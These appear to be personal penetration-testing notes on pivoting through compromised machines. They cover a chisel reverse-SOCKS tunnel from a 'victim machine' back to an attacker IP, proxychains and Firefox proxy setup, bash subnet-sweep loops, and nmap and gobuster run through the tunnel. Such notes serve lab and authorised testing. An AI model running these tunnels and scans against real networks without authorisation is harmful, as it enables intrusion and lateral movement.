# Pivoting


It could be handy to have the executables to share between every new machine:
- <https://github.com/andrew-d/static-binaries>







## SSHuttle
- <https://www.youtube.com/watch?v=1BLAeXOQOl4>







## chisel
- <https://github.com/jpillora/chisel>

Note: depending on the environment, the latest version may not work.

```
# listen from attacker machine
chisel server --reverse -p [PORT NUMBER]

# from victim machine 1
chisel client [ATTACKER IP]:[PORT NUMBER] R:socks


```



### Proxychains
- dynamic_chain: Uses proxies in the order they appear in the list. All proxies in the chain must be available.
- random_chain: Chooses a random proxy from the list for each connection.
- static_chain: Uses proxies in the exact order they are listed.


unset `strict_chain`` and set `dynamic_chain` in `/etc/proxychains.conf`
at the end of proxychains.conf add `socks5 127.0.0.1 [tunnel PORT]`
Note: Tunnel port is 1080 by default
also in the firefox:
- manual proxy configuration > Sock Host: 127.0.0.1 Port: [tunnel PORT]
or
- set foxy proxy
or
- launch it using `proxychains -q firefox`	









## Enumeration

### see active hosts pwned machines
```bash

hostname -I


# script 1
#!/bin/bash
for i in {1..255}; do
        timeout 1 bash -c "ping -c 1 20.20.20.$i" >/dev/null
        if [ $? -eq 0 ]; then
                echo "El host 20.20.20.$i estÃ¡ activo"
        fi
done


# script 2 (in case ping is not installed)
#!/bin/bash

for host in $(seq 1 254); do
	timeout 1 bash -c "echo '' > /dev/tcp/30.30.30.$host/80 &> /dev/null" &&
	echo "30.30.30.$host";
done; wait
	
```

### nmap
```
sudo proxychains -q nmap -p [PORT NUMBER] -sCVT -Pn -n [IP]	
```



### gobuster
```
gobuster dir -u http://20.20.20.3 \
	-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
	-x php,doc,html,txt \
	--proxy socks5://127.0.0.1:1080
```










## socat
On Windows use `netsh`
